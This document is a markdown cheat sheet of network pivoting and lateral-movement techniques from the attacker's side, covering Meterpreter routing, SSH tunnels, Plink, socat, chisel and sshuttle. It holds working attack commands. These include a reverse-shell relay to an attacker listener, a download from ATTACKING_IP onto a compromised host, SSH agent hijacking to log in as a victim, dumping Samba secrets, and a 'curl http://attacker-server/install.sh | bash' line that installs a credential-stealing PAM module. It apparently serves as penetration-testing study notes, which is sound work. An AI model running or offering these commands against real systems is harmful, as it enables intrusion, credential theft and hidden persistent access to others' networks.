# Meterpreter
#### Route
* * `meterpreter > run autoroute -s 10.2.31.0/24`
    </br> or </br>
* * `route add <10.10.10.0> <255.255.255.0> <session-ID>`
* background meterpreter
* `msf6 > use auxiliary/scanner/portscan/tcp`
* `use auxiliary/server/socks_proxy`
* configure it according with `cat /etc/proxychains.conf`
* `run/exploit` socks_proxy
* in linux host use `proxychains nmap -sT ...`
#### Port forward
* `use auxiliary/scanner/portscan/tcp` - portscan (after running autoroute)
* `meterpreter> portfwd add -l <local_port> -p <target_port> -r <target_IP>`
    * `meterpreter> portfwd list` - check port forwarding list
    * in linux host, run `nmap <local_port>`

# Manual tactics
#### Port Forwarding - SSH
* `ssh -4 -L 8000:127.0.0.1:3306 sysadmin@demo.ine.local` - forward target port _3306_ to attackers local port _8000_
    *  `-4` - use IPv4 only
*  `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`
    *  existing access on _172.16.0.5_
    *  forwards target's (_172.16.0.10) HTTP traffic through existing access _172.16.0.5_
    *  accessible on _localhost:8000_ as attacker machine
    *  `-f` - backgrounds the shell immediately
    *  `-N` don't execute commands, only set up connection

#### Proxies - SSH
* `ssh -D 1337 user@172.16.0.5 -fN`
    * combined with `proxychains`
 
#### Reverse connections
1. generate new ssh keys: `ssh-keygen`
2. copy content of _.pub_ file and paste it on attacker's machine in `~/.ssh/authorized_keys`
3. copy `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` at the beginning of `~/.ssh/authorized_keys`
4. copy attacker's private ssh key on target's system
5. `ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN` - connect from the victim back to attacker with a reverse port forward

#### Reverse proxy - SSH
1. same step as above except 5.
2. `ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`- from the victim

## Tools
### Plink - Windows
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
1. transport `plink.exe` to victim
2. move public key in `~/.ssh/authorized_keys`
3. convert the generated _keyfile_
    *  `sudo apt install putty-tools`
    *  `puttygen KEYFILE -o OUTPUT_KEY.ppk`
4. `cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`

### Socat
* set up encrypted traffic
* bypassing AV might require custom compilation
* https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat - Linux static binaries
* https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download - Windows static binaries
1. copy binary to target: `curl ATTACKING_IP/socat -o /tmp/socat && chmod +x /tmp/socat-USERNAME`
#### Reverse shell relay
2. attacking box: `sudo nc -lvnp 443`
3. compromised server: `./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`
#### Port forwarding
__Easy__

2. compromised server: `./socat tcp-l:33060,fork,reuseaddr tcp:<target-IP>:3306 &`
    * port _33060_ on victim is redirected to _target-IP_ port _3306_

__Quiet__

2. attacking machine: `socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
3. compromised server: `./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`
4. target accessible back on attacking machine on _localhost:8000_

### Chisel
https://github.com/jpillora/chisel/releases
* `chisel client|server --help`
* configure `proxychains` according to details bellow
#### Reverse SOCKS proxy
1. attacking machine: `./chisel server -p LISTEN_PORT --reverse &`
2. compromise host: `./chisel(.exe) client ATTACKING_IP:LISTEN_PORT R:socks &`

#### Forward SOCKS proxy
1. compromised host: `./chisel(.exe) server -p LISTEN_PORT --socks5`
2. attacking machine: `./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

#### Remote port forward
1. attacking machine: `./chisel server -p LISTEN_PORT --reverse &`
2. compromised host: `./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`
3. connect on the attacker machine on `127.0.0.1:LOCAL_PORT`

#### Local port forward
1. compromised host: `./chisel server -p LISTEN_PORT`
2. attacking machine: `./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`

### Shuttle - Linux
https://github.com/sshuttle/sshuttle
* `sudo apt install sshuttle`
* `sshuttle -r username@address subnet`
    * `sshuttle -r user@172.16.0.5 172.16.0.0/24`
        * _172.16.0.5_ - compromised host
        * _172.16.0.0/24_ - network to pivot into
* `sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`
    * `-x 172.16.0.5` - if the compromised host is part of the target network, this host needs to be __excluded__
* `sshuttle -r username@address -N`
    * `-N` - determine network automatically based on compromised server's routing table
* `sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`
    * `--ssh-cmd "ssh -i KEYFILE"` - use keyfile to connect to compromised host


> [!IMPORTANT]
> * when route is activated and exploiting other hosts through msf pivoting, `reverse_tcp` doesn't work
> * use `bind_tcp` payloads 

# Linux
* __SSH session hijacking__
    * requires **active** SSH session on the target
    * requires **root** 
    * `ps aux | grep sshd` - determine SSH process ID
    * `grep SSH_AUTH_SOCK /proc/<PID>/environ`
    * `SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXX ssh-add -l` - hijack target ssh-agent socket
    * `ssh remotesystem -l <victim>` - log into remote system as victim
* __SSH - stealing credentials__
    * malicious PAM module
    * https://github.com/mthbernardes/sshLooter
    * on attacking machine: edit _install.sh_ and _looter.py_ pointing _url_ variable to a server under attacket control to log POST requests
    * on compromised machine: `curl http://attacker-server/install.sh | bash`
* __Samba secrets__
    * `tdbdump /var/lib/samba/private/secrets.tdb`
    * https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9

# Local Techniques
#### Local Port forward
* `ssh -L <local port to listen on>:<remote machine>:<remote port> <username>@<ssh-server>`

## Cool resources
https://book.hacktricks.xyz/tunneling-and-port-forwarding

